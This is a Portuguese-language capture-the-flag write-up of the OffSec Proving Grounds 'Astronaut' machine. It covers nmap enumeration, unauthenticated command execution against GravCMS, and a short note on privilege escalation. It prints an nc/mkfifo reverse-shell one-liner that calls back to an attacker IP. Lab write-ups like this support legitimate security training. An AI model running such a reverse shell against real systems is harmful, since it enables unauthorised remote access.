---
title:     "OffSec Proving Grounds - Astronaut"
tags: [linux,easy,GravCMS]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/5cc98efa-789e-4ca2-adf1-378c54f6a041)

## Enumeration

Aqui está uma versão revisada do relatório com foco na fase de enumeração e a inclusão do comando adicional que você mencionou:

---

# OffSec Proving Grounds - Astronaut

**Tags:** linux, easy, GravCMS  
**Categorias:** OffSecProvingGrounds

![image](https://github.com/user-attachments/assets/5cc98efa-789e-4ca2-adf1-378c54f6a041)

## 1. Enumeration

### 1.1 Varredura Inicial com Nmap

Para iniciar a enumeração da máquina "Astronaut", foi realizada uma varredura completa de portas utilizando o `nmap`, com o objetivo de identificar todas as portas abertas.

```
nmap -T4 -p- -Pn 192.168.188.12 -oN nmap-all-ports.log -v
```

**Detalhes do Comando:**

- `-T4`: Ajusta a velocidade da varredura para um nível agressivo.
- `-p-`: Varre todas as 65535 portas TCP disponíveis.
- `-Pn`: Ignora a verificação de host ativo, presumindo que o alvo está acessível.
- `192.168.188.12`: IP da máquina alvo "Astronaut".
- `-oN nmap-all-ports.log`: Salva os resultados da varredura em um arquivo de log nomeado `nmap-all-ports.log`.
- `-v`: Ativa o modo verbose para maior detalhamento durante a execução.

### 1.2 Varredura Adicional com NmapAutomator

Além da varredura inicial com `nmap`, utilizamos o script `nmapAutomator` para realizar uma enumeração mais abrangente, cobrindo todos os tipos de varredura suportados pelo script.

```
nmapAutomator.sh -H 192.168.188.12 -t All -o nmapautomator.log
```

**Detalhes do Comando:**

- `-H 192.168.188.12`: Define o alvo para a varredura como o IP 192.168.188.12.
- `-t All`: Executa todos os tipos de varredura disponíveis, incluindo descoberta de portas, serviços, scripts e vulnerabilidades.
- `-o nmapautomator.log`: Salva os resultados em um arquivo de log nomeado `nmapautomator.log`.

### Resultados da Enumeração

Os resultados dessas varreduras fornecerão um panorama detalhado dos serviços e portas abertas na máquina "Astronaut". Com essas informações em mãos, podemos prosseguir para identificar potenciais vetores de ataque e vulnerabilidades.

![image](https://github.com/user-attachments/assets/41c420eb-01a0-4960-a316-a9da803e5e34)

Conforme mostrado na imagem, identificamos as portas 80 e 22 abertas. Ao acessar a porta 80 via navegador, encontramos um CMS chamado GravCMS.

## Exploitation

Usando o Searchsploit, disponível por padrão no Kali, encontramos uma exploração interessante. Como não tínhamos credenciais de login, optamos por usar a exploração não autenticada, que parecia ser a mais adequada. Ao testar inicialmente, obtivemos sucesso, conseguindo executar comandos remotamente. No entanto, antes disso, foi necessário ajustar o exploit para o nosso ambiente. Após realizar os ajustes, utilizei o comando ping na máquina remota enquanto monitorava o tráfego com tcpdump na minha máquina local. Quando executei o exploit, verifiquei que a exploração foi bem-sucedida.

![image](https://github.com/user-attachments/assets/78fc4ebf-6289-4e0f-b1ee-6a65953ff32a)

```
echo -ne "ping -c 10 192.168.45.184" | base64 -w0
```

![image](https://github.com/user-attachments/assets/a8a751e3-4530-4624-88cd-44cd4f7e3806)


Sabendo que o exploit estava funcionando perfeitamente para a execução de comandos, encodei uma reverse shell em base64 de acordo com o exploit. 

A reverse shell foi a seguinte:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.184 443 >/tmp/f
```

![image](https://github.com/user-attachments/assets/7021b890-a792-4f79-9e06-b387bf8718e5)

Após a codificação e execução, consegui obter um reverse shell na máquina alvo com sucesso, confirmando a vulnerabilidade e a execução remota de comandos.

Para mais informações sobre diferentes técnicas de reverse shell, você pode consultar o [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) da Pentest Monkey.

## Privilege Escalation

Na etapa de escalonamento de privilégios, encontrei algumas complicações, não pela falta de conhecimento, mas devido a bugs na própria máquina. Passei algumas horas enumerando manualmente e utilizando ferramentas como linenum.sh e linpeas.sh.

Minha teoria sobre isso é que, se você obtém uma reverse shell e executa imediatamente essas ferramentas automáticas de enumeração, o vetor de ataque que deveria ser explorado pode desaparecer. Somente depois de reiniciar a máquina e realizar a enumeração manualmente é que o processo de escalonamento de privilégios parece funcionar corretamente, permitindo finalmente a obtenção de acesso root.

Essa situação sugere que, em algumas máquinas vulneráveis, os scripts automáticos podem, por algum motivo, interferir na exploração adequada dos vetores de ataque, tornando a abordagem manual mais eficaz em certos cenários.
